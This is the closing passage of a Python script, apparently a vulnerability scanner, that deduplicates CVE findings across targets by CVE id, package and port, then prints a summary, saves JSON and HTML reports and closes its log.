    # Dedupe across all targets
    seen, final = set(), []
    for f in all_findings:
        key = (f.get("cve_id"), f.get("package"), f.get("port"))
        if key in seen: continue
        seen.add(key)
        final.append(f)

    print_summary(final)

    if SAVE_JSON:
        save_json(final, OUTPUT_DIR / f"findings-{timestamp}.json")
    if SAVE_HTML:
        save_html(final, OUTPUT_DIR / f"report-{timestamp}.html")

    LOG._write(f"\n{'═'*88}")
    LOG._write(f"  DONE — {len(final)} finding(s) from {len(TARGETS)} target(s)")
    LOG._write(f"{'═'*88}\n")
    LOG.close()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nInterrupted by user.")
        sys.exit(130)
